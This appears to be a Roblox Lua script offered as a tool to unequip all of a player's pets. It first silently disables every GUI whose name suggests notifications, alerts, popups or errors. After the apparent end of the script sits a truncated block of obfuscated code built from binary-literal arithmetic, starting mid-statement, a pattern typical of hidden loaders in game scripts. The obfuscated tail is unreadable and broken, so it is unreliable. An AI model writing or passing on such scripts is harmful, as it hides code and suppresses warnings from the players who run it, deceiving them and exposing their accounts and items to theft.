local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Safely require the networking module
local Networking
local success, result = pcall(function()
    Networking = require(ReplicatedStorage.SharedModules.Networking)
end)

if not success or not Networking then
    warn("Failed to load Networking module, using fallback method")
end

local function BlockNotifications()
    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then return end
    
    for _, gui in playerGui:GetChildren() do
        if gui:IsA("ScreenGui") then
            local name = gui.Name:lower()
            if name:find("notif") or name:find("alert") or name:find("toast") or name:find("popup") or name:find("message") or name:find("error") then
                pcall(function()
                    gui.Enabled = false
                end)
            end
        end
    end
end

local function UnequipAllPets()
    -- Block notifications
    BlockNotifications()
    
    -- Find equipped pets
    local visualClient = workspace:FindFirstChild("_PetVisualClient")
    if not visualClient then
        print("No pets equipped")
        return
    end
    
    local modelsFolder = visualClient:FindFirstChild("Models")
    if not modelsFolder then
        print("No pets equipped")
        return
    end
    
    -- Get all pet models with their info
    local equippedPets = {}
    for _, petModel in modelsFolder:GetChildren() do
        if petModel:IsA("Model") then
            local petName = petModel.Name
            local petId = petModel:GetAttribute("PetID")
            local ownerSlot = petModel:GetAttribute("OwnerSlot")
            
            -- Try to get actual pet name from slot
            if ownerSlot then
                local playerPetRefs = workspace:FindFirstChild("PlayerPetReferences")
                if playerPetRefs then
                    local playerFolder = playerPetRefs:FindFirstChild(player.Name)
                    if playerFolder then
                        local slotPart = playerFolder:FindFirstChild(ownerSlot)
                        if slotPart then
                            local species = slotPart:GetAttribute("PetSpecies")
                            if species and species ~= "" then
                                petName = species
                            end
                        end
                    end
                end
            end
            
            if petName and petName ~= "" then
                table.insert(equippedPets, {
                    Name = petName,
                    Id = petId,
                    Slot = ownerSlot,
                    Model = petModel
                })
            end
        end
    end
    
    if #equippedPets == 0 then
        print("No pets currently equipped")
        return
    end
    
    print(string.format("Found %d equipped pets", #equippedPets))
    
    local successCount = 0
    
    -- Method 1: Try network unequip if available
    if Networking and Networking.Pets then
        print("Using network method...")
        for _, pet in equippedPets do
            local unequipSuccess = false
            
            -- Try by ID first
            if pet.Id and pet.Id ~= "" then
                pcall(function()
                    if Networking.Pets.RequestUnequip then
                        Networking.Pets.RequestUnequip:Fire(pet.Id)
                        unequipSuccess = true
                    end
                end)
            end
            
            -- Try by name if ID failed or not available
            if not unequipSuccess then
                pcall(function()
                    if Networking.Pets.RequestUnequipByName then
                        Networking.Pets.RequestUnequipByName:Fire(pet.Name)
                        unequipSuccess = true
                    end
                end)
            end
            
            if unequipSuccess then
                successCount = successCount + 1
                print(string.format("✓ Unequipped: %s", pet.Name))
            else
                print(string.format("✗ Failed to unequip: %s", pet.Name))
            end
            
            task.wait(0.1)
        end
    end
    
    -- Method 2: Fallback to UI method if network failed
    if successCount < #equippedPets then
        print("Attempting UI fallback method...")
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local petList = playerGui:FindFirstChild("PetList")
            if petList then
                local scrollingFrame = petList
                for _, name in {"Frame", "Notepad", "ScrollingFrame"} do
                    scrollingFrame = scrollingFrame and scrollingFrame:FindFirstChild(name)
                end
                
                if scrollingFrame then
                    for _, child in scrollingFrame:GetChildren() do
                        if child:IsA("Frame") and child.Name ~= "Template" then
                            local mainFrame = child:FindFirstChild("Main_Frame")
                            if mainFrame then
                                local unequipButton = mainFrame:FindFirstChild("Unequip")
                                if unequipButton and unequipButton:IsA("GuiButton") and unequipButton.Visible then
                                    local petName = child:GetAttribute("PetName") or child.Name
                                    if petName and petName ~= "Template" then
                                        for _, pet in equippedPets do
                                            if pet.Name == petName then
                                                pcall(function()
                                                    unequipButton:Fire()
                                                    successCount = successCount + 1
                                                    print(string.format("✓ UI Unequipped: %s", petName))
                                                end)
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    print(string.format("Successfully unequipped %d out of %d pets", successCount, #equippedPets))
end

-- Safe execution with error handling
local execSuccess, execError = pcall(UnequipAllPets)
if not execSuccess then
    warn("Unequip failed: " .. tostring(execError))
end

o,e in ipairs({{0b11011001011011011101101100110%0b10111001100010100001111;0b1011001111111111011-0b1011001111111000111},{0b110010100110110111010110100001%0b10011101111111100101000;0b111110101110100101001010000000%0b10010001111111000001100};{((0b100101100001100111111111001101%0b110011000100010010100100+0b11101011011110110111101100001010010)%0b1001000011111000001011101001)%0b11100101001111111111,-379176+0b1011100100101011100}})do while e[0b10001110111011101111-0b10001110111011101110]<e[-733078-(-733080)]do
